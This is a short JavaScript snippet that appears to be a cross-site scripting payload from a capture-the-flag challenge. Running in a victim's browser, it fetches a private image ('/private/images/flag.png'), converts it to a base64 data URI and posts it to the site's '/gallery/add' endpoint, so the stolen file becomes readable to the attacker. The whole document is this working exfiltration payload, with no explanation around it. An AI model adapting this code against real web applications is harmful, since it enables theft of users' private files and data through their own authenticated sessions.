function post(content) {
 fetch('/gallery/add', {
   method: 'POST',
   headers: {
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
   },
   body: "title="+encodeURIComponent(content)+"&link=http%3A%2F%2Ffoo%2Ecom&uuid="+document.location.pathname.split("/")[2]
 }) 
}

fetch('/private/images/flag.png')
.then( response => response.blob() )
.then( blob =>{
    var reader = new FileReader() ;
    reader.onload = function(){ post(this.result) } ; // <--- `this.result` contains a base64 data URI
    reader.readAsDataURL(blob) ;
}) ;
